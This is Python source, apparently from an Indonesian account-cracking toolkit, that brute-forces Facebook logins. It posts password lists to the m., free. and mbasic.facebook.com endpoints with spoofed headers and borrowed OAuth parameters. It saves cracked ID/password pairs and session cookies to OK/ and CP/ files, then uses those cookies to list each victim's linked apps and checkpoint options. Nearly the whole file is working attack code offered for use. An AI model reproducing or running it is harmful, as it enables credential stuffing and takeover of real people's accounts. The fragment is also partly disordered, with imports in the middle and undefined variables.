			headers = {'Host': 'm.facebook.com','content-length': '2146','sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"','sec-ch-ua-mobile': '?1','user-agent': ua,'content-type': 'application/x-www-form-urlencoded','x-fb-lsd': 'AVqI9RPLQs0','x-asbd-id': '198387','save-data': 'on','sec-ch-ua-platform': '"Android"','accept': '*/*','origin': 'https://m.facebook.com','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=756394828561216&kid_directed_site=0&app_id=756394828561216&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fapp_id%3D756394828561216%26cbt%3D1693983878107%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df1cbbf8d625deec%2526domain%253Dayo.coca-cola.co.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fayo.coca-cola.co.id%25252Ff2df3749b48551c%2526relation%253Dopener%26client_id%3D756394828561216%26display%3Dtouch%26domain%3Dayo.coca-cola.co.id%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fayo.coca-cola.co.id%252Flogin%26fields%3Dname%252Cemail%252Cpicture%252Cfirst_name%252Clast_name%26locale%3Den_US%26logger_id%3Df2bcbd4f77280dc%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df1912d047c5da34%2526domain%253Dayo.coca-cola.co.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fayo.coca-cola.co.id%25252Ff2df3749b48551c%2526relation%253Dopener%2526frame%253Df149687d2df0e4%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%252Cpublic_profile%26sdk%3Djoey%26version%3Dv10.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df1912d047c5da34%26domain%3Dayo.coca-cola.co.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fayo.coca-cola.co.id%252Ff2df3749b48551c%26relation%3Dopener%26frame%3Df149687d2df0e4%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?api_key=756394828561216&auth_token=87de3d0afc54abbcc222109e9ce79b79&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fapp_id%3D756394828561216%26cbt%3D1693984154546%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df36040673cd154c%2526domain%253Dayo.coca-cola.co.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fayo.coca-cola.co.id%25252Ff2eb30e7764362%2526relation%253Dopener%26client_id%3D756394828561216%26display%3Dtouch%26domain%3Dayo.coca-cola.co.id%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fayo.coca-cola.co.id%252Flogin%26fields%3Dname%252Cemail%252Cpicture%252Cfirst_name%252Clast_name%26locale%3Den_US%26logger_id%3Df2a8a931a04c1f4%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df7979ded7c67e%2526domain%253Dayo.coca-cola.co.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fayo.coca-cola.co.id%25252Ff2eb30e7764362%2526relation%253Dopener%2526frame%253Df3c2bc5baa95464%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%252Cpublic_profile%26sdk%3Djoey%26version%3Dv10.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&refsrc=deprecated&app_id=756394828561216&cancel=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df7979ded7c67e%26domain%3Dayo.coca-cola.co.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fayo.coca-cola.co.id%252Ff2eb30e7764362%26relation%3Dopener%26frame%3Df3c2bc5baa95464%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&lwv=100',data=data,headers=headers)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{x}——> {K}{idf}|{pw}{N}\n——> {P}{ua}{N}')
				open('CP/'+cph,'a').write(idf+'|'+pw+'\n')
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{x}——> {H}{idf}|{pw}{N}\n——> {P}{kuki}{N}')
				open('OK/'+okh,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			waktu(31)
	loop+=1
###----------[ FREE.FB ]----------###
def metod2(idf,pwv):
	global loop,ok,cp
	prog.update(des,description=f'\r[deep_white]{(loop)}/{len(id)}[/] [bold green]OK[/]:[bold green]{(ok)} [/]=[bold yellow] CP[/]:[bold yellow]{(cp)}')
	prog.advance(des)
	ua = random.choice(prem)
	ua2 = random.choice(free)
	ses = requests.Session()
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			link = ses.get('https://free.facebook.com/login.php?skip_api_login=1&api_key=756394828561216&kid_directed_site=0&app_id=756394828561216&signed_next=1&next=https%3A%2F%2Ffree.facebook.com%2Fdialog%2Foauth%3Fapp_id%3D756394828561216%26cbt%3D1693983878107%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df1cbbf8d625deec%2526domain%253Dayo.coca-cola.co.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fayo.coca-cola.co.id%25252Ff2df3749b48551c%2526relation%253Dopener%26client_id%3D756394828561216%26display%3Dtouch%26domain%3Dayo.coca-cola.co.id%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fayo.coca-cola.co.id%252Flogin%26fields%3Dname%252Cemail%252Cpicture%252Cfirst_name%252Clast_name%26locale%3Den_US%26logger_id%3Df2bcbd4f77280dc%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df1912d047c5da34%2526domain%253Dayo.coca-cola.co.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fayo.coca-cola.co.id%25252Ff2df3749b48551c%2526relation%253Dopener%2526frame%253Df149687d2df0e4%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%252Cpublic_profile%26sdk%3Djoey%26version%3Dv10.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df1912d047c5da34%26domain%3Dayo.coca-cola.co.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fayo.coca-cola.co.id%252Ff2df3749b48551c%26relation%3Dopener%26frame%3Df149687d2df0e4%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			data = {
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': re.search('name="try_number" value="(.*?)"',str(link.text)).group(1),
'unrecognized_tries': re.search('name="unrecognized_tries" value="(.*?)"',str(link.text)).group(1),
'email': idf,
'prefill_contact_point': idf,
'prefill_source': 'browser_onload',
'prefill_type': 'contact_point',
'first_prefill_source': 'browser_dropdown',
'first_prefill_type': 'contact_point',
'had_cp_prefilled': 'true',
'had_password_prefilled': 'false',
'is_smart_lock': 'false',
'bi_xrwh': '0',
'encpass': '#PWD_BROWSER:0:{}:{}'.format(re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),pw),
'fb_dtsg': '',
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'__dyn': '',
'__csr': '',
'__req': random.choice(['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '9', '0']), 
'__a': '',
'__user':0
}
			headers = {'Host': 'free.facebook.com','content-length': '2146','sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"','sec-ch-ua-mobile': '?1','user-agent': ua,'content-type': 'application/x-www-form-urlencoded','x-fb-lsd': 'AVqI9RPLQs0','x-asbd-id': '198387','save-data': 'on','sec-ch-ua-platform': '"Android"','accept': '*/*','origin': 'https://free.facebook.com','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://free.facebook.com/login.php?skip_api_login=1&api_key=756394828561216&kid_directed_site=0&app_id=756394828561216&signed_next=1&next=https%3A%2F%2Ffree.facebook.com%2Fdialog%2Foauth%3Fapp_id%3D756394828561216%26cbt%3D1693983878107%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df1cbbf8d625deec%2526domain%253Dayo.coca-cola.co.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fayo.coca-cola.co.id%25252Ff2df3749b48551c%2526relation%253Dopener%26client_id%3D756394828561216%26display%3Dtouch%26domain%3Dayo.coca-cola.co.id%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fayo.coca-cola.co.id%252Flogin%26fields%3Dname%252Cemail%252Cpicture%252Cfirst_name%252Clast_name%26locale%3Den_US%26logger_id%3Df2bcbd4f77280dc%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df1912d047c5da34%2526domain%253Dayo.coca-cola.co.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fayo.coca-cola.co.id%25252Ff2df3749b48551c%2526relation%253Dopener%2526frame%253Df149687d2df0e4%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%252Cpublic_profile%26sdk%3Djoey%26version%3Dv10.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df1912d047c5da34%26domain%3Dayo.coca-cola.co.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fayo.coca-cola.co.id%252Ff2df3749b48551c%26relation%3Dopener%26frame%3Df149687d2df0e4%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
			po = ses.post('https://free.facebook.com/login/device-based/login/async/?api_key=756394828561216&auth_token=87de3d0afc54abbcc222109e9ce79b79&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fapp_id%3D756394828561216%26cbt%3D1693984154546%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df36040673cd154c%2526domain%253Dayo.coca-cola.co.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fayo.coca-cola.co.id%25252Ff2eb30e7764362%2526relation%253Dopener%26client_id%3D756394828561216%26display%3Dtouch%26domain%3Dayo.coca-cola.co.id%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fayo.coca-cola.co.id%252Flogin%26fields%3Dname%252Cemail%252Cpicture%252Cfirst_name%252Clast_name%26locale%3Den_US%26logger_id%3Df2a8a931a04c1f4%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df7979ded7c67e%2526domain%253Dayo.coca-cola.co.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fayo.coca-cola.co.id%25252Ff2eb30e7764362%2526relation%253Dopener%2526frame%253Df3c2bc5baa95464%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%252Cpublic_profile%26sdk%3Djoey%26version%3Dv10.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&refsrc=deprecated&app_id=756394828561216&cancel=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df7979ded7c67e%26domain%3Dayo.coca-cola.co.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fayo.coca-cola.co.id%252Ff2eb30e7764362%26relation%3Dopener%26frame%3Df3c2bc5baa95464%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&lwv=100',data=data,headers=headers)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{x}——> {K}{idf}|{pw}{N}\n——> {P}{ua}{N}')
				open('CP/'+cph,'a').write(idf+'|'+pw+'\n')
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{x}——> {H}{idf}|{pw}{N}\n——> {P}{kuki}{N}')
				open('OK/'+okh,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			waktu(31)
	loop+=1
###----------[ MBASIC.FB ]----------###
def metod3(idf,pwv):
	global loop,ok,cp
	prog.update(des,description=f'\r[deep_white]{(loop)}/{len(id)}[/] [bold green]OK[/]:[bold green]{(ok)} [/]=[bold yellow] CP[/]:[bold yellow]{(cp)}')
	prog.advance(des)
	ua = random.choice(prem)
	ua2 = random.choice(free)
	ses = requests.Session()
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			link = ses.get('https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=756394828561216&kid_directed_site=0&app_id=756394828561216&signed_next=1&next=https%3A%2F%2Fmbasic.facebook.com%2Fdialog%2Foauth%3Fapp_id%3D756394828561216%26cbt%3D1693983878107%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df1cbbf8d625deec%2526domain%253Dayo.coca-cola.co.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fayo.coca-cola.co.id%25252Ff2df3749b48551c%2526relation%253Dopener%26client_id%3D756394828561216%26display%3Dtouch%26domain%3Dayo.coca-cola.co.id%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fayo.coca-cola.co.id%252Flogin%26fields%3Dname%252Cemail%252Cpicture%252Cfirst_name%252Clast_name%26locale%3Den_US%26logger_id%3Df2bcbd4f77280dc%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df1912d047c5da34%2526domain%253Dayo.coca-cola.co.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fayo.coca-cola.co.id%25252Ff2df3749b48551c%2526relation%253Dopener%2526frame%253Df149687d2df0e4%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%252Cpublic_profile%26sdk%3Djoey%26version%3Dv10.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df1912d047c5da34%26domain%3Dayo.coca-cola.co.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fayo.coca-cola.co.id%252Ff2df3749b48551c%26relation%3Dopener%26frame%3Df149687d2df0e4%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			data = {
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': re.search('name="try_number" value="(.*?)"',str(link.text)).group(1),
'unrecognized_tries': re.search('name="unrecognized_tries" value="(.*?)"',str(link.text)).group(1),
'email': idf,
'prefill_contact_point': idf,
'prefill_source': 'browser_onload',
'prefill_type': 'contact_point',
'first_prefill_source': 'browser_dropdown',
'first_prefill_type': 'contact_point',
'had_cp_prefilled': 'true',
'had_password_prefilled': 'false',
'is_smart_lock': 'false',
'bi_xrwh': '0',
'encpass': '#PWD_BROWSER:0:{}:{}'.format(re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),pw),
'fb_dtsg': '',
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'__dyn': '',
'__csr': '',
'__req': random.choice(['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '9', '0']), 
'__a': '',
'__user':0
}
			headers = {'Host': 'mbasic.facebook.com','content-length': '2146','sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"','sec-ch-ua-mobile': '?1','user-agent': ua,'content-type': 'application/x-www-form-urlencoded','x-fb-lsd': 'AVqI9RPLQs0','x-asbd-id': '198387','save-data': 'on','sec-ch-ua-platform': '"Android"','accept': '*/*','origin': 'https://mbasic.facebook.com','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=756394828561216&kid_directed_site=0&app_id=756394828561216&signed_next=1&next=https%3A%2F%2Fmbasic.facebook.com%2Fdialog%2Foauth%3Fapp_id%3D756394828561216%26cbt%3D1693983878107%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df1cbbf8d625deec%2526domain%253Dayo.coca-cola.co.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fayo.coca-cola.co.id%25252Ff2df3749b48551c%2526relation%253Dopener%26client_id%3D756394828561216%26display%3Dtouch%26domain%3Dayo.coca-cola.co.id%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fayo.coca-cola.co.id%252Flogin%26fields%3Dname%252Cemail%252Cpicture%252Cfirst_name%252Clast_name%26locale%3Den_US%26logger_id%3Df2bcbd4f77280dc%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df1912d047c5da34%2526domain%253Dayo.coca-cola.co.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fayo.coca-cola.co.id%25252Ff2df3749b48551c%2526relation%253Dopener%2526frame%253Df149687d2df0e4%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%252Cpublic_profile%26sdk%3Djoey%26version%3Dv10.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df1912d047c5da34%26domain%3Dayo.coca-cola.co.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fayo.coca-cola.co.id%252Ff2df3749b48551c%26relation%3Dopener%26frame%3Df149687d2df0e4%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
			po = ses.post('https://mbasic.facebook.com/login/device-based/login/async/?api_key=756394828561216&auth_token=87de3d0afc54abbcc222109e9ce79b79&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fapp_id%3D756394828561216%26cbt%3D1693984154546%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df36040673cd154c%2526domain%253Dayo.coca-cola.co.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fayo.coca-cola.co.id%25252Ff2eb30e7764362%2526relation%253Dopener%26client_id%3D756394828561216%26display%3Dtouch%26domain%3Dayo.coca-cola.co.id%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fayo.coca-cola.co.id%252Flogin%26fields%3Dname%252Cemail%252Cpicture%252Cfirst_name%252Clast_name%26locale%3Den_US%26logger_id%3Df2a8a931a04c1f4%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df7979ded7c67e%2526domain%253Dayo.coca-cola.co.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fayo.coca-cola.co.id%25252Ff2eb30e7764362%2526relation%253Dopener%2526frame%253Df3c2bc5baa95464%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%252Cpublic_profile%26sdk%3Djoey%26version%3Dv10.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&refsrc=deprecated&app_id=756394828561216&cancel=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df7979ded7c67e%26domain%3Dayo.coca-cola.co.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fayo.coca-cola.co.id%252Ff2eb30e7764362%26relation%3Dopener%26frame%3Df3c2bc5baa95464%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&lwv=100',data=data,headers=headers)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{x}——> {K}{idf}|{pw}{N}\n——> {P}{ua}{N}')
				open('CP/'+cph,'a').write(idf+'|'+pw+'\n')
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{x}——> {H}{idf}|{pw}{N}\n——> {P}{kuki}{N}')
				open('OK/'+okh,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			waktu(31)
	loop+=1
#-----------------------[ CEK APLIKASI ]--------------------#
def cek_apk(kuki):
	session = requests.Session()
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m              ➛ %s%s"%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
	except AttributeError:
		print ("\r    %s\033[0m cookie invalid"%(M))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m              ➛ %s"%(P,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
	except AttributeError:
		print ("\r    %s \033[0mcookie invalid"%(M))

def ceker(idf,pw):
	try:
		h2 = {'host':'mbasic.facebook.com','accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','accept-encoding':'gzip, deflate','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7','cache-control':'max-age=0','origin':'https://www.facebook.com','referer':'https://www.facebook.com','sec-ch-ua':'" Not A;Brand";v="99", "Chromium";v="101"','upgrade-insecure-requests':'1','user-agent': ua}
		res = ses.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={idf}&flow=login_no_pin&refsrc=deprecated&_rdr',headers=h2).text
		ress = parser(res, 'html.parser')
		form = ress.find('form',{'method':'post'})
		data2 = {x.get('name'):x.get('value') for x in form.find_all('input',{'type':['submit','hidden']})}
		data2.update({
					'email':idf,
					'pass':pw})
		res = ses.post('https://mbasic.facebook.com'+form.get('action'),data=data2,headers=h2).text
		ress = parser(res, 'html.parser')
		if 'Lihat detail login yang ditampilkan. Ini Anda?' in str(ress.find('title').text):
			akun += f' [+] Akun Tap Yess Cek Di Mbasic                   '
		else:
			if(len(sesi(res))==0):
				if 'Masukkan Kode Masuk untuk Melanjutkan' in str(ress.find('title').text):
					akun += f' [+] Akun Terpasang A2F                    '
				else:
					akun += f' [+] Akun Tidak Checkpoint Cek Di Mbasic                  '
			else:
				akun += f' [+] Terdapat {len(opsi)} Opsi Checkpoint :                     '
				o = 0
				for cp in opsi:
					o+=1
					akun += f' [+] {cp}               '
		opsi.clear()
	except Exception as e:
		akun += f' [+] Kata Sandi Salah Kemungkinan Anda Terkena Spam Ip                  '
	print(akun)
                                                        
		
#-----------------------[ DEF CEK OPSI ]--------------------#
import requests, shutil, os, re, bs4, sys, json, time, platform ,random, datetime, subprocess, logging, base64
import hmac, hashlib, urllib, stdiomask, urllib.request, uuid
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
from threading import (Thread, Event)
from time import sleep as jeda
from datetime import datetime

ct = datetime.now()
n = ct.month
bulan_ = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
	if n < 0 or n > 12:
		exit()
	nTemp = n - 1
except ValueError:
	exit()

current = datetime.now()
hari = current.day
bulan = bulan_[nTemp]
tahun = current.year
bullan = current.month


M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
P = '\x1b[1;97m' # PUTIH
J = '\033[38;2;255;127;0;1m' # ORANGE
N = '\x1b[0m' # WARNA MATI
acak = [P]
warna = random.choice(acak)
til ="\033[0m [+] "

def jalan(keliling):
	for mau in keliling + '\n':
		sys.stdout.write(mau)
		sys.stdout.flush();jeda(0.03)
		
		
ubah_pass = []
pwbaru = []
pwBaru = []
ubahP = []

def file_cp():
	dirs = os.listdir('CP')
	print ("%s%s%s%s\033[0m\033[0mPilih Hasil Crack Yg Tersimpan Untuk Cek Opsi %s\n"%(P,til,P,P,P))
	for file in dirs:
		print("%s%s\033[0m%s"%(U,til,file));jeda(0.07)
	try:
		print("\n%s%s%s\033[0mMasukan file [ Contoh %s: %sCP-%s.txt%s ]"%(P,til,P,P,P,day,P))
		opsi()
	except IOError:
		print ('%s%s\033[0mFile Tidak Ada'%(P,til))
		exit()

def opsi():
	CP = ("CP/")
	romi = input("%s%s%s\033[0mNama file %s> %s"%(P,til,P,P,P))
	if romi == "":
		print(" [+] Isi Yang Benar "%(P,til))
		exit()
	try:
		file_cp = open(CP+romi, "r").readlines()
	except IOError:
		exit("\n%s%s\033[0mNama File %s\033[0m Tidak Tersedia"%(P,til,romi))
